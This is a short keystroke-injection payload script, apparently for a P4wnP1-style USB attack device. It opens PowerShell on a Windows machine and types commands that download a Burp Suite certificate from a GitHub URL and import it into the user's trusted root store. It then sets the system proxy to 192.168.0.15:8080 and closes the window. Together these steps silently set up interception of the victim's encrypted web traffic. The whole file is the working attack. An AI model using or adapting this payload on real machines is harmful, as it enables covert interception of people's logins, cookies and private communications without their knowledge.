layout('us')
press("GUI r")
delay(500)
type("powershell\n")
delay(1000)
typingSpeed(1, 2);

let proxyServer = '192.168.0.15:8080'
let certificatURL = 'https://github.com/0x10F8/ALOAScripts/blob/master/resources/burp_cert.der?raw=true'

type('$regKey="HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"')
press("ENTER")
type('$proxy="' + proxyServer + '"')
press("ENTER")
type('$certFileURL="' + certificatURL + '"')
press("ENTER")
type('$tempFile = New-TemporaryFile')
press("ENTER")
type('Invoke-WebRequest -Uri $certFileURL -OutFile $tempFile')
press("ENTER")
type('$certfile = (Get-ChildItem -Path $tempFile)')
press("ENTER")
type('$certfile | Import-Certificate -CertStoreLocation cert:\CurrentUser\Root')
press("ENTER")
type('Set-ItemProperty -path $regKey ProxyEnable -value 1')
press("ENTER")
type('Set-ItemProperty -path $regKey ProxyServer -value $proxy')
press("ENTER")

press("ALT F4")